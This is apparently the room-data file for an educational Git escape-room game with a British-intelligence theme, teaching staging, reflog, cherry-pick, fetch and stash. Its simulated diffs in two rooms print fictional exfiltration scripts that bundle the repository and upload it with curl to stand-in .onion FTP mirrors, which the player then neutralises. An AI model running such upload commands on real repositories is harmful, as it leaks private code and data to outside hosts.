// ═══════════════════════════════════════════════════════════════════════
// OPERATION: NIGHTSHADE — ROOM DATA
// Six rooms. Advanced Git concepts. British intelligence theme.
// CONTROL is the handler. ATLAS is the repository. NS = nightshade agent.
// ═══════════════════════════════════════════════════════════════════════

const ROOMS = [

  // ──────────────────────────────────────────────────────────────────────
  // ROOM 0: CONTAINMENT
  // git status, git diff --staged, git restore --staged, git commit
  // ──────────────────────────────────────────────────────────────────────
  {
    id: 0,
    name: 'CONTAINMENT',
    initialTree: 'n0_initial',
    clue: { label: 'PROTOCOL', value: 'ATLAS-LOCK-01' },
    intro: "NIGHTSHADE's workstation. Still logged in. Something got staged alongside a legitimate audit entry — sitting quietly in the index. It commits the moment anyone types git commit. Read what's staged before you touch anything.",
    stages: [
      {
        conceptBrief: {
          title: 'HOW THE NAMES ARE BEING PUBLISHED',
          bullets: [
            "NIGHTSHADE planted an automated pipeline: every hour, a script reads 5 entries from the ATLAS registry and publishes them to a public mirror",
            "at midnight: --all flag. every remaining name, simultaneously",
            "the pipeline lives inside this repository. dismantle the layers here — kill the machine"
          ],
          ascii: '  cron (hourly) → publish.sh → 5 names\n  cron (00:00)  → publish.sh --all → everything'
        },
        foxMsg: "LION: \"NIGHTSHADE's session is still open. Run git status — tell me what's in this repo right now.\"",
        task: 'Check the full state of the repository.',
        accepted: ['git status'],
        output: [
          ['On branch main', 'br'],
          ['', ''],
          ['Changes to be committed:', 'sys'],
          ['    modified:   meridian_ops.log', 'ok'],
          ['    new file:   trigger.sh', 'err'],
          ['', ''],
          ['Changes not staged for commit:', 'sys'],
          ['    modified:   assets.enc', 'warn'],
          ['    modified:   config/deploy.conf', 'dim'],
          ['', ''],
          ['two files are staged. one is legitimate. one is not.', 'dim'],
        ],
        tree: 'n0_initial',
        wrong: {}
      },
      {
        conceptBrief: {
          title: 'THE THREE ZONES',
          bullets: [
            "git diff shows unstaged changes (working dir vs staging). git diff --staged shows staged changes vs last commit — exactly what the next commit contains",
            "the staging area is silent. it never warns you. you have to look"
          ],
          ascii: '  working dir      →   staging area     →   repository\n  git diff              git diff --staged    git log\n  (WD vs stage)         (stage vs repo)      (committed history)'
        },
        foxMsg: "LION: \"Check what's actually in the staging area — not the working directory. You need to see exactly what the next commit would contain.\"",
        task: 'Inspect what is currently staged for commit.',
        accepted: ['git diff --staged', 'git diff --cached'],
        output: [
          ['diff --git a/meridian_ops.log b/meridian_ops.log', 'dim'],
          ['--- a/meridian_ops.log', 'dim'],
          ['+++ b/meridian_ops.log', 'dim'],
          ['@@ -12,0 +13 @@', 'dim'],
          ['+[23:11] session closed — audit complete', 'ok'],
          ['', ''],
          ['diff --git a/trigger.sh b/trigger.sh', 'dim'],
          ['new file mode 100755', 'dim'],
          ['--- /dev/null', 'dim'],
          ['+++ b/trigger.sh', 'dim'],
          ['@@ -0,0 +1,6 @@', 'dim'],
          ['+#!/bin/bash', 'err'],
          ['+# nightshade dead man\'s switch — do not inspect', 'err'],
          ['+git bundle create /tmp/atlas.bundle --all', 'err'],
          ['+curl -s -T /tmp/atlas.bundle ftp://mirror-01.onion/drop/', 'err'],
          ['+rm -f /tmp/atlas.bundle', 'err'],
          ['', ''],
          ['meridian_ops.log: legitimate audit entry.', 'ok'],
          ["trigger.sh: nightshade's bomb. bundles and exfiltrates the entire ATLAS repo.", 'err'],
        ],
        tree: 'n0_staged',
        wrong: {
          'git diff': [
            ['diff --git a/assets.enc b/assets.enc', 'dim'],
            ['--- a/assets.enc', 'dim'],
            ['+++ b/assets.enc', 'dim'],
            ['@@ -7,3 +7,6 @@', 'dim'],
            ['+## NIGHTSHADE EXPORT MARKER', 'err'],
            ['+DUMP_TARGET: darknet://mirror-01.onion:9001', 'err'],
            ['+EXEC_ON_MERGE: true', 'err'],
            ['', ''],
            ['this shows working directory changes — assets.enc was modified but not staged.', 'dim'],
            ['you need git diff --staged to see what IS currently staged for the next commit.', 'warn'],
          ]
        }
      },
      {
        foxMsg: "LION: \"Remove trigger.sh from staging. Don't touch the working directory — just unstage it.\"",
        task: 'Unstage trigger.sh without modifying the working directory.',
        accepted: ['git restore --staged trigger.sh', 'git reset HEAD trigger.sh', 'git reset trigger.sh'],
        output: [
          ['trigger.sh removed from the staging area.', 'ok'],
          ['file still exists in the working directory — just unstaged.', 'dim'],
        ],
        tree: 'n0_initial',
        wrong: {
          'git restore trigger.sh': [
            ['warning: git restore without --staged discards working directory changes.', 'warn'],
            ['to unstage a file without touching it: git restore --staged trigger.sh', 'sys'],
          ],
          'git rm trigger.sh': [
            ['git rm would delete the file entirely. you only need to unstage it.', 'warn'],
            ['use: git restore --staged trigger.sh', 'sys'],
          ]
        }
      },
      {
        foxMsg: "LION: \"Staging area is clean. Commit the legitimate change and seal this layer.\"",
        task: 'Commit the staged changes with a meaningful message.',
        flexCommit: true,
        tree: 'n0_committed',
        wrong: {},
        completionMsg: "staging area contained. trigger.sh is out. meridian_ops.log is committed cleanly. first layer: neutralised. nightshade was counting on the reflex to commit without reading."
      }
    ],
    hints: [
      [
        'check the state of the repository. there is a specific command that shows you everything at once.',
        'git status shows what is staged, what is modified, and what is untracked — all in one view.',
        'git status — no flags needed. it never changes anything, it only shows the current state of all three zones.\n\nrun: git status'
      ],
      [
        'you need to see what is in the staging area — not what is in your working directory.',
        'git diff on its own shows working directory changes. to see what is staged: add a flag.',
        'git diff --staged shows the difference between the staging area and the last commit — exactly what would go into the next commit right now.\n\nrun: git diff --staged'
      ],
      [
        'you need to remove trigger.sh from staging without deleting the file.',
        'git restore with the --staged flag removes a file from the index (staging area) without touching the working directory.',
        'git restore --staged trigger.sh — the surgical tool for removing one file from staging.\n\nrun: git restore --staged trigger.sh'
      ],
      [
        'the staging area is clean. commit the remaining staged change with a message.',
        'git commit -m \'...\' commits all staged changes with the message you provide.',
        'git commit -m \'seal meridian audit log\' — keep it specific. what changed? why?\n\nrun: git commit -m \'seal meridian audit log\''
      ]
    ]
  },

  // ──────────────────────────────────────────────────────────────────────
  // ROOM 1: DEAD RECKONING
  // git log --oneline --all, git checkout <hash>, git switch -c, git switch
  // ──────────────────────────────────────────────────────────────────────
  {
    id: 1,
    name: 'DEAD RECKONING',
    initialTree: 'n1_log',
    clue: { label: 'TIMESTAMP', value: '2024-03-12T23:42:07Z' },
    intro: "NIGHTSHADE planted the pipeline six weeks ago — one commit, disguised as a config update. The timestamp inside tells you when the registry was first loaded. Reach that commit. When the terminal says something alarming: read it, then proceed.",
    stages: [
      {
        conceptBrief: {
          title: 'DETACHED HEAD STATE',
          bullets: [
            "normally HEAD → branch → commits. checking out a commit hash puts HEAD in detached state — pointing directly at that commit, not a branch",
            "in detached HEAD you can look freely. commits made here are orphaned when you leave unless you name them",
            "git switch -c <name> creates a branch at your current position and re-attaches HEAD"
          ],
          ascii: '  normal:    HEAD → main → [commit]\n  detached:  HEAD → [commit]  (no branch label)'
        },
        foxMsg: "LION: \"Read the log. All branches. Find where NIGHTSHADE planted the cardinal trigger.\"",
        task: 'View the full commit history including all branches.',
        accepted: ['git log --oneline --all', 'git log --all --oneline', 'git log --oneline', 'git log'],
        output: [
          ['{{H3}} (HEAD -> main) audit: seal meridian ops log', 'cm'],
          ['{{H4}} config: update deploy parameters', 'dim'],
          ['{{H2}} (nightshade/cardinal) plant cardinal trigger — phase 2', 'hl'],
          ['{{H7}} initial: atlas repository setup', 'dim'],
          ['', ''],
          ['commit {{H2}} — nightshade planted phase 2 at that point.', 'sys'],
        ],
        tree: 'n1_log',
        wrong: {}
      },
      {
        foxMsg: "LION: \"That commit. Go there. When you see the detached HEAD warning — read it. Then proceed.\"",
        task: 'Checkout the commit where the cardinal trigger was planted.',
        accepted: ['git checkout {{H2}}'],
        output: [
          ["Note: switching to '{{H2}}'.", 'sys'],
          ['', ''],
          ["You are in 'detached HEAD' state. You can look around, make", 'warn'],
          ["experimental commits, and discard them, but any commits you make", 'warn'],
          ["won't be tracked unless you create a branch.", 'warn'],
          ['', ''],
          ['HEAD is now at {{H2}} plant cardinal trigger — phase 2', 'ok'],
          ['', ''],
          ["you're at the right commit. HEAD is pointing directly here, not at a branch.", 'dim'],
          ['cardinal_net.dat is at this version — the transmission schedule is inside.', 'dim'],
          ['preserve your position: create a branch before you leave.', 'sys'],
        ],
        tree: 'n1_detached',
        wrong: {
          'git checkout {{H1}}': [['wrong commit. that hash belongs to another layer. look at the log — find the nightshade/cardinal commit.', 'err']],
          'git checkout {{H3}}': [["that's main's current tip. look for the nightshade/cardinal commit hash in the log.", 'err']],
          'git checkout {{H4}}': [['not that one. look for the commit labelled nightshade/cardinal in the log.', 'err']]
        }
      },
      {
        foxMsg: "LION: \"Create a branch here before you move. Without a branch label, this position vanishes the second you leave.\"",
        task: 'Create a branch at the current detached HEAD position to preserve it.',
        accepted: [
          'git switch -c forensics/cardinal-evidence',
          'git switch -c evidence',
          'git switch -c cardinal-evidence',
          'git checkout -b forensics/cardinal-evidence',
          'git checkout -b evidence',
          'git checkout -b cardinal-evidence',
          'git checkout -c forensics/cardinal-evidence',
          'git checkout -c evidence',
          'git checkout -c cardinal-evidence',
          'git branch forensics/cardinal-evidence',
          'git branch evidence'
        ],
        output: [
          ["Switched to a new branch 'forensics/cardinal-evidence'", 'ok'],
          ['', ''],
          ['HEAD is now attached to a branch.', 'dim'],
          ['this position is preserved — it will not be lost when you switch away.', 'dim'],
          ['commit {{H2}} is now reachable by branch name.', 'sys'],
        ],
        tree: 'n1_evidence',
        wrong: {
          'git switch main': [
            ['you need to name this position first — create a branch at this commit before you leave.', 'warn'],
            ['git switch -c <branch-name> creates a branch here and attaches HEAD to it.', 'dim']
          ],
          'git switch -c forensics': [
            ['close — but the branch needs the full name: forensics/cardinal-evidence', 'warn'],
            ['run: git switch -c forensics/cardinal-evidence', 'dim']
          ],
          'git checkout -b forensics': [
            ['close — but the branch needs the full name: forensics/cardinal-evidence', 'warn'],
            ['run: git checkout -b forensics/cardinal-evidence', 'dim']
          ],
          'git checkout -c forensics': [
            ['close — but the branch needs the full name: forensics/cardinal-evidence', 'warn'],
            ['run: git checkout -c forensics/cardinal-evidence', 'dim']
          ]
        }
      },
      {
        foxMsg: "LION: \"Evidence branch created. Return to main. The next threat is waiting there.\"",
        task: 'Return to the main branch.',
        accepted: ['git switch main', 'git checkout main'],
        output: [
          ['Switched to branch \'main\'', 'ok'],
          ['Your branch is up to date with \'origin/main\'.', 'dim'],
          ['', ''],
          ['back on main. forensics/cardinal-evidence is preserved.', 'dim'],
          ['coordinate logged. cardinal trigger location confirmed.', 'sys'],
        ],
        tree: 'n1_main',
        wrong: {},
        completionMsg: "detached HEAD navigated. evidence branch secured. NIGHTSHADE planted this six weeks ago — they expected the detached HEAD warning alone would stop anyone from going further. it didn't."
      }
    ],
    hints: [
      [
        'you need to see the full commit history — all branches, all commits.',
        'git log shows history. add --oneline to compress it. add --all to include commits on other branches.',
        'git log --oneline --all — compact, complete, all branches shown.\n\nrun: git log --oneline --all'
      ],
      [
        'you need to travel to a specific commit in the history. you have the hash from the log.',
        'git checkout can take a branch name or a specific commit hash. with a hash, you enter detached HEAD state.',
        'git checkout {{H2}} — paste the hash from the log. you\'ll see a warning message. that\'s expected.\n\nrun: git checkout {{H2}}'
      ],
      [
        "you're in detached HEAD. create a branch at your current position before you leave.",
        'git switch -c creates a new branch AND switches to it in one step — at your current position in history.',
        'git switch -c forensics/cardinal-evidence creates a branch right here.\n\nrun: git switch -c forensics/cardinal-evidence'
      ],
      [
        'evidence is preserved. now return to the main branch.',
        'git switch main moves HEAD back to the main branch.',
        'git switch main — HEAD re-attaches to the branch, pointing at main\'s latest commit.\n\nrun: git switch main'
      ]
    ]
  },

  // ──────────────────────────────────────────────────────────────────────
  // ROOM 2: CONFLICTED LOYALTIES
  // git status, edit file (conflict), git add, git commit
  // ──────────────────────────────────────────────────────────────────────
  {
    id: 2,
    name: 'CONFLICTED LOYALTIES',
    initialTree: 'n2_conflict',
    clue: { label: 'SECTOR', value: 'MERIDIAN-NET' },
    intro: "Before detention, NIGHTSHADE forced a merge. Their inject branch has assets.enc with EXPORT_ENABLED: true — the flag the pipeline reads every cycle. The merge left conflict markers. Resolve it wrong and the registry goes live on the next run.",
    stages: [
      {
        conceptBrief: {
          title: 'MERGE CONFLICTS — THREE STEPS',
          bullets: [
            "conflict markers: <<<<<<< HEAD (your version) — ======= (divider) — >>>>>>> branch (incoming). remove all three marker lines, keep what belongs",
            "step 2: git add <file> — tells git the conflict is resolved. skipping this leaves the merge broken",
            "step 3: git commit — seals the merge. all three steps required"
          ],
          ascii: '  <<<<<<< HEAD\n  EXPORT_ENABLED: false    ← your version (keep this)\n  =======\n  EXPORT_ENABLED: true\n  EXFIL_TARGET: darknet   ← incoming (remove this)\n  >>>>>>> nightshade/inject\n\n  delete all 3 marker lines. keep only what belongs.'
        },
        foxMsg: "LION: \"Run git status. Find the conflicted file.\"",
        task: 'Check which files are in a conflicted state.',
        accepted: ['git status'],
        output: [
          ['On branch main', 'br'],
          ['You have unmerged paths.', 'err'],
          ['  (fix conflicts and run "git commit")', 'dim'],
          ['  (use "git merge --abort" to abort the merge)', 'dim'],
          ['', ''],
          ['Unmerged paths:', 'sys'],
          ['  both modified:   assets.enc', 'err'],
          ['', ''],
          ['the merge is unfinished. assets.enc has conflict markers inside it.', 'dim'],
          ['open the file, resolve the conflict, then stage it.', 'sys'],
        ],
        tree: 'n2_conflict',
        wrong: {
          'git merge --abort': [
            ['merge aborted — back to pre-merge state.', 'warn'],
            ['', ''],
            ['git merge --abort works when you want to give up entirely.', 'dim'],
            ['but this conflict has to be resolved — the system is unstable until it is.', 'dim'],
            ['run git status to see the conflicted file and proceed.', 'sys']
          ],
          'git commit': [
            ['error: Committing is not possible because you have unmerged files.', 'err'],
            ['hint: Fix them up in the work tree, and then use', 'dim'],
            ["hint: 'git add/rm <file>' as appropriate to mark resolution.", 'dim'],
            ['', ''],
            ['you cannot commit a merge until all conflicts are resolved and staged.', 'dim'],
            ['run git status first — find the conflicted file.', 'sys']
          ]
        }
      },
      {
        foxMsg: "LION: \"Open assets.enc. Two versions separated by markers. HEAD is ours. The other side is NIGHTSHADE's. Keep ours. Delete everything else.\"",
        task: "Resolve the conflict in assets.enc — keep the HEAD version, remove NIGHTSHADE's export configuration.",
        fileEdit: true,
        fileName: 'assets.enc',
        fileEditType: 'conflict',
        tree: 'n2_staged_pre',
        wrong: {}
      },
      {
        foxMsg: "LION: \"File resolved. Stage it — that's how you tell git the conflict is handled.\"",
        task: 'Stage the resolved file to mark the conflict as resolved.',
        accepted: ['git add assets.enc', 'git add .'],
        output: [
          ['assets.enc staged — conflict marked as resolved.', 'ok'],
          ['', ''],
          ["LION: \"one step left. commit it. seal the merge.\"", 'sys'],
        ],
        tree: 'n2_staged',
        wrong: {}
      },
      {
        foxMsg: "LION: \"Commit. The merge doesn't exist until the commit does.\"",
        task: 'Complete the merge with a commit.',
        flexCommit: true,
        accepted: [
          'git commit',
          'git commit --no-edit',
          'git commit -m "resolve conflict: remove nightshade export target"',
          'git commit -m "merge resolved"',
          'git commit -m "fix conflict"',
          'git commit -m "resolve conflict"'
        ],
        output: [
          ["[main {{H4}}] Merge branch 'nightshade/inject' — conflict resolved", 'cm'],
          ['', ''],
          ['assets.enc: EXPORT_ENABLED: false. EXFIL_TARGET: none.', 'ok'],
          ["NIGHTSHADE's export configuration removed from the asset registry.", 'dim'],
          ['', ''],
          ["LION: \"Clean. The history was tampered with next. Reflog will show you what they hid.\"", 'sys'],
        ],
        tree: 'n2_merged',
        wrong: {},
        completionMsg: "merge conflict resolved. assets.enc is clean. the three-step ritual: edit, add, commit. most people forget the last two and wonder why the merge is still broken."
      }
    ],
    hints: [
      [
        'find out which files have merge conflicts.',
        'git status always tells you the current state — including unmerged paths.',
        'git status — look for Unmerged paths or both modified.\n\nrun: git status'
      ],
      [
        'open the conflicted file and resolve the markers. keep the HEAD block. delete NIGHTSHADE\'s block and all three marker lines.',
        'use the edit command to open the file in the editor. remove everything between and including the conflict markers.',
        'type: edit assets.enc — remove the <<<<<<, ======, >>>>>>> markers and NIGHTSHADE\'s export configuration. keep the HEAD version.'
      ],
      [
        'the file is resolved. now tell git the conflict is fixed.',
        'git add marks a previously conflicted file as resolved in the staging area.',
        'git add assets.enc — stages the resolved file and removes its unmerged status.\n\nrun: git add assets.enc'
      ],
      [
        'the merge is not complete until you commit it.',
        'git commit seals the merge. git will auto-generate a merge commit message — accept it or write your own.',
        'git commit — with no flags, git uses the auto-generated merge message. just run it.\n\nrun: git commit'
      ]
    ]
  },

  // ──────────────────────────────────────────────────────────────────────
  // ROOM 3: THE GREAT ERASURE
  // git log --oneline, git reflog, git cherry-pick, git log --oneline
  // ──────────────────────────────────────────────────────────────────────
  {
    id: 3,
    name: 'THE GREAT ERASURE',
    initialTree: 'n3_reset',
    clue: { label: 'CREDENTIAL', value: 'NS-DISABLE-7731' },
    intro: "Before detention, NIGHTSHADE ran git reset --hard, then git push --force. The credential is gone from every normal view. But git doesn't delete — it orphans. Find it.",
    stages: [
      {
        conceptBrief: {
          title: "REWRITING HISTORY — LEVELS OF DANGER",
          bullets: [
            'git reset --hard moves the branch pointer backward — commits above become orphaned. recoverable locally via reflog for ~90 days',
            'git push --force overwrites the remote. destroys history for everyone who fetched. no recovery once others have pulled',
            'git reflog records every HEAD movement — resets, checkouts, switches — even what git log hides'
          ],
          ascii: '  reset --hard  →  local only, reflog recovers it\n  push --force  →  overwrites remote, no recovery for others\n\n  reflog: YOUR private diary. exists locally only.'
        },
        foxMsg: "LION: \"Check the commit history. Tell me what's visible — and what should be there but isn't.\"",
        task: 'Check the current commit history.',
        accepted: ['git log --oneline', 'git log'],
        output: [
          ['{{H4}} (HEAD -> main) Merge branch \'nightshade/inject\'', 'cm'],
          ['{{H3}} audit: seal meridian ops log', 'dim'],
          ['{{H7}} initial: atlas repository setup', 'dim'],
          ['', ''],
          ['only three commits visible.', 'warn'],
          ['nightshade ran git reset --hard before detention. the credential is still here — somewhere.', 'dim'],
        ],
        tree: 'n3_reset',
        wrong: {}
      },
      {
        foxMsg: "LION: \"Those commits aren't gone — git tracks every HEAD movement, even after a reset. There's a record. Find it.\"",
        task: 'Find the orphaned commits.',
        accepted: ['git reflog', 'git reflog show', 'git log -g'],
        output: [
          ['{{H4}} (HEAD -> main) HEAD@{0}: merge: Merge nightshade/inject', 'cm'],
          ['{{H3}} HEAD@{1}: commit: audit: seal meridian ops log', 'dim'],
          ['{{H5}} HEAD@{2}: commit: [nightshade] shutdown: arming dead man switch', 'hl'],
          ['{{H6}} HEAD@{3}: commit: [nightshade] payload: cardinal net staging', 'dim'],
          ['{{H8}} HEAD@{4}: reset: moving to HEAD~3', 'warn'],
          ['{{H7}} HEAD@{5}: commit: initial: atlas repository setup', 'dim'],
          ['', ''],
          ['HEAD@{2}: {{H5}} — the shutdown commit. wiped from the log, still here.', 'sys'],
        ],
        tree: 'n3_reset',
        wrong: {
          'git log --all': [
            ['{{H4}} (HEAD -> main) Merge branch \'nightshade/inject\'', 'cm'],
            ['{{H3}} audit: seal meridian ops log', 'dim'],
            ['{{H7}} initial: atlas repository setup', 'dim'],
            ['', ''],
            ['git log --all shows all branches but not orphaned commits.', 'warn'],
            ['orphaned commits have no branch pointing to them.', 'dim'],
            ['use git reflog — it records every HEAD movement including after resets.', 'sys']
          ]
        }
      },
      {
        foxMsg: "LION: \"Cherry-pick that hash. Bring the shutdown commit to the current branch.\"",
        task: 'Restore the orphaned shutdown commit using cherry-pick.',
        accepted: ['git cherry-pick {{H5}}'],
        output: [
          ['[main {{H5}}] [nightshade] shutdown: arming dead man switch', 'ok'],
          ['', ''],
          ['1 file changed, 3 insertions(+)', 'dim'],
          [' create mode 100644 shutdown.key', 'ok'],
          ['', ''],
          ['shutdown.key restored.', 'sys'],
          ['it contains NS-DISABLE-7731 — the credential that disarms the switch.', 'dim'],
          ['confirm with git log --oneline.', 'dim'],
        ],
        tree: 'n3_cherry',
        wrong: {
          'git cherry-pick {{H6}}': [['that commit contains staging data, not the shutdown credential. check the reflog — you need HEAD@{2}.', 'warn']],
          'git cherry-pick {{H8}}': [['that is the reset operation entry, not a content commit. look for HEAD@{2} in the reflog.', 'err']],
          'git push --force origin main': [
            ['ABORT: refusing force push.', 'err'],
            ['', ''],
            ['force pushing rewrites the remote branch for every person on your team.', 'warn'],
            ['any teammate who fetched before this push now has a diverged branch they cannot cleanly merge.', 'dim'],
            ['their local history and the remote are no longer compatible.', 'dim'],
            ['', ''],
            ['force push is how nightshade tried to make the deletion permanent.', 'sys'],
            ['reflog only exists locally — they knew remote history is unrecoverable.', 'dim'],
            ["use cherry-pick to bring the commit forward instead. don't rewrite shared history.", 'sys']
          ],
          'git push --force': [
            ['ABORT: refusing force push to shared branch.', 'err'],
            ['force push destroys remote history for the whole team. use cherry-pick instead.', 'sys']
          ]
        }
      },
      {
        foxMsg: "LION: \"Confirm the recovery. Log it.\"",
        task: 'Verify the shutdown commit is back in the history.',
        accepted: ['git log --oneline', 'git log'],
        output: [
          ['{{H5}} (HEAD -> main) [nightshade] shutdown: arming dead man switch', 'hl'],
          ['{{H4}} Merge branch \'nightshade/inject\'', 'dim'],
          ['{{H3}} audit: seal meridian ops log', 'dim'],
          ['{{H7}} initial: atlas repository setup', 'dim'],
          ['', ''],
          ['confirmed. the shutdown credential is back in history.', 'ok'],
          ['NS-DISABLE-7731 is live.', 'sys'],
          ['one layer remains. the threat is on the remote.', 'dim'],
        ],
        tree: 'n3_cherry',
        wrong: {},
        completionMsg: "orphaned commits recovered. reflog records your movements only — not the remote's. nightshade force pushed because remote history is unrecoverable for the team. cherry-pick brought it back."
      }
    ],
    hints: [
      [
        'check what the current commit history looks like.',
        'git log --oneline gives a compact view of history on the current branch.',
        'git log --oneline — see what is there and what is visibly missing.\n\nrun: git log --oneline'
      ],
      [
        'orphaned commits are not in git log — but git keeps a record of every position HEAD has ever occupied.',
        'git reflog shows the full HEAD movement history, including commits cut off by a reset.',
        'git reflog — scan for commit messages that mention shutdown, or look for the reset entry to find what was above it.\n\nrun: git reflog'
      ],
      [
        'you found the hash. bring that specific commit back to the current branch.',
        'git cherry-pick <hash> applies a single commit from anywhere in history to your current branch.',
        'git cherry-pick {{H5}} — this brings only that one commit across, not the full branch history.\n\nrun: git cherry-pick {{H5}}'
      ],
      [
        'verify the recovery worked.',
        'git log --oneline will now show the cherry-picked commit at the top of the history.',
        'git log --oneline — confirm the shutdown commit is back.\n\nrun: git log --oneline'
      ]
    ]
  },

  // ──────────────────────────────────────────────────────────────────────
  // ROOM 4: INCOMING SIGNAL
  // git log, git fetch origin, git log origin/nightshade/transmit, git diff, git push --delete
  // ──────────────────────────────────────────────────────────────────────
  {
    id: 4,
    name: 'INCOMING SIGNAL',
    initialTree: 'n4_local',
    clue: { label: 'VECTOR', value: 'origin/nightshade/transmit' },
    intro: "NIGHTSHADE pushed nightshade/transmit to the remote — the actual CI job definition, the scheduled pipeline config. Our server auto-merges any nightshade/* branch at midnight. Once it lands, the pipeline is permanent — independent of everything else you fixed. Do not pull. Fetch first, inspect, then decide.",
    stages: [
      {
        conceptBrief: {
          title: 'FETCH vs PULL',
          bullets: [
            'git fetch downloads remote changes without touching your branch — safe, read-only',
            'git pull = fetch + merge in one step — it immediately integrates what it downloads. that is why you do NOT pull here',
            'origin/nightshade/transmit is a local snapshot. always fetch first, inspect, then decide'
          ],
          ascii: '  before fetch:  origin/main ─── C4          (stale snapshot)\n  after fetch:   origin/main ─── C4 ─── C5  (updated, branch untouched)\n  after merge:   main        ─── C4 ─── C5'
        },
        foxMsg: "LION: \"Check your local state first. Then we deal with the remote.\"",
        task: 'Verify the current local commit history.',
        accepted: ['git log --oneline', 'git log'],
        output: [
          ['{{H5}} (HEAD -> main) [nightshade] shutdown: arming dead man switch', 'cm'],
          ['{{H4}} Merge branch \'nightshade/inject\'', 'dim'],
          ['{{H3}} audit: seal meridian ops log', 'dim'],
          ['{{H7}} initial: atlas repository setup', 'dim'],
          ['', ''],
          ['local is clean. the threat is on the remote.', 'dim'],
        ],
        tree: 'n4_local',
        wrong: {}
      },
      {
        foxMsg: "LION: \"Fetch. Download the remote state. Do not pull — that merges automatically.\"",
        task: 'Download the remote state without merging anything.',
        accepted: ['git fetch origin', 'git fetch', 'git fetch --all'],
        output: [
          ['From gchq-atlas-secure://atlas-repo', 'dim'],
          [' * [new branch]      nightshade/transmit -> origin/nightshade/transmit', 'hl'],
          ['', ''],
          ['remote branch detected. your working directory is unchanged.', 'warn'],
        ],
        tree: 'n4_fetched',
        wrong: {
          'git pull': [
            ['fast-forward merge attempted...', 'warn'],
            ['', ''],
            ['warning: git pull merges immediately — use git fetch to inspect first.', 'err'],
            ['run git fetch origin instead to download without merging.', 'sys'],
          ]
        }
      },
      {
        foxMsg: "LION: \"Look at what came in. Read the commits on that remote branch.\"",
        task: 'Inspect the commits on the remote nightshade/transmit branch.',
        accepted: [
          'git log origin/nightshade/transmit --oneline',
          'git log origin/nightshade/transmit',
          'git log --oneline origin/nightshade/transmit'
        ],
        output: [
          ['{{H1}} (origin/nightshade/transmit) final: trigger armed — awaiting merge', 'hl'],
          ['{{H2}} payload: mirror list compiled — 14 targets', 'err'],
          ['{{H6}} inject: atlas bundle script activated', 'err'],
          ['{{H8}} init: nightshade transmit channel', 'dim'],
          ['', ''],
          ['four commits. the final one arms the trigger on merge. 14 exfiltration mirrors.', 'warn'],
        ],
        tree: 'n4_fetched',
        wrong: {}
      },
      {
        foxMsg: "LION: \"Look at what's actually in that branch versus your local main.\"",
        task: 'Compare your local main with the remote nightshade/transmit branch.',
        accepted: [
          'git diff main origin/nightshade/transmit',
          'git diff HEAD origin/nightshade/transmit',
          'git diff origin/nightshade/transmit'
        ],
        output: [
          ['diff --git a/transmit.sh b/transmit.sh', 'dim'],
          ['new file mode 100755', 'dim'],
          ['+++ b/transmit.sh', 'dim'],
          ['+#!/bin/bash', 'err'],
          ['+# NIGHTSHADE FINAL PAYLOAD — do not inspect', 'err'],
          ['+git bundle create /tmp/atlas_final.bundle --all', 'err'],
          ['+for mirror in $(cat mirrors.list); do', 'err'],
          ['+  curl -s -T /tmp/atlas_final.bundle ftp://$mirror/drop/ &', 'err'],
          ['+done && wait', 'err'],
          ['+rm -f /tmp/atlas_final.bundle', 'err'],
          ['', ''],
          ['transmit.sh: bundles ATLAS and uploads to 14 simultaneous mirrors. delete the branch.', 'err'],
        ],
        tree: 'n4_fetched',
        wrong: {}
      },
      {
        foxMsg: "LION: \"Delete the remote branch. Before midnight.\"",
        task: 'Delete the nightshade/transmit branch from the remote repository.',
        accepted: [
          'git push origin --delete nightshade/transmit',
          'git push origin -d nightshade/transmit'
        ],
        output: [
          ['To gchq-atlas-secure://atlas-repo', 'dim'],
          [' - [deleted]         nightshade/transmit', 'ok'],
          ['', ''],
          ['remote branch destroyed.', 'ok'],
          ['the pipeline has nothing to merge at midnight.', 'dim'],
          ['the transmission script is dead.', 'sys'],
          ['', ''],
          ["LION: \"One layer left. NIGHTSHADE's stash. That's where it ends.\"", 'sys'],
        ],
        tree: 'n4_deleted',
        wrong: {
          'git branch -d nightshade/transmit': [
            ['that deletes a local branch. the threat is on the remote server.', 'warn'],
            ['to delete a remote branch: git push origin --delete nightshade/transmit', 'sys']
          ],
          'git branch -D nightshade/transmit': [
            ['that deletes a local branch. this branch is on origin, not locally.', 'warn'],
            ['to delete a remote branch: git push origin --delete nightshade/transmit', 'sys']
          ]
        },
        completionMsg: "remote branch eliminated. fetch downloads without merging. origin/nightshade/transmit was a local snapshot of the remote branch — now both are gone. the pipeline has nothing to run at midnight."
      }
    ],
    hints: [
      [
        'verify your current local state before touching the remote.',
        'git log --oneline shows the history on your current branch.',
        'git log --oneline — confirm your local main, then move to the remote.\n\nrun: git log --oneline'
      ],
      [
        'download the remote state without integrating it into your branch.',
        'git fetch downloads remote changes. it updates origin/* pointers without touching your branches.',
        'git fetch origin — safe. your working directory and main branch are completely untouched.\n\nrun: git fetch origin'
      ],
      [
        'inspect what commits are on the remote branch you just fetched.',
        'git log can take a branch name as an argument — including remote-tracking branches like origin/nightshade/transmit.',
        'git log origin/nightshade/transmit --oneline — see every commit on that branch.\n\nrun: git log origin/nightshade/transmit --oneline'
      ],
      [
        'see exactly what that branch would add to your codebase if merged.',
        'git diff compares any two references — branches, commits, or remote-tracking branches.',
        'git diff main origin/nightshade/transmit — shows what is different between local main and the remote branch.\n\nrun: git diff main origin/nightshade/transmit'
      ],
      [
        'delete the remote branch before the pipeline merges it at midnight.',
        'git push with --delete removes a branch on the remote server.',
        'git push origin --delete nightshade/transmit — removes the branch from origin, not just locally.\n\nrun: git push origin --delete nightshade/transmit'
      ]
    ]
  },

  // ──────────────────────────────────────────────────────────────────────
  // ROOM 5: THE DEAD DROP
  // git stash list, git stash show -p, git stash apply, git stash drop
  // ──────────────────────────────────────────────────────────────────────
  {
    id: 5,
    name: 'THE DEAD DROP',
    initialTree: 'n5_stash',
    clue: { label: 'STATUS', value: 'DISARMED' },
    intro: "Three stashes on NIGHTSHADE's machine. One kills the pipeline. One re-enables it. One is noise. The labels aren't yours to trust. Read the diff before you touch anything.",
    stages: [
      {
        conceptBrief: {
          title: 'THE STASH IS A STACK — NOT A SAFE',
          bullets: [
            'stash@{0} is always the newest — indices shift every time you stash. what was {1} yesterday may be {2} today',
            'git stash pop = apply stash@{0} AND remove it from the stack — ignores any index argument. cannot be undone',
            'git stash show -p stash@{N} inspects a stash without applying it. always do this before pop or apply'
          ],
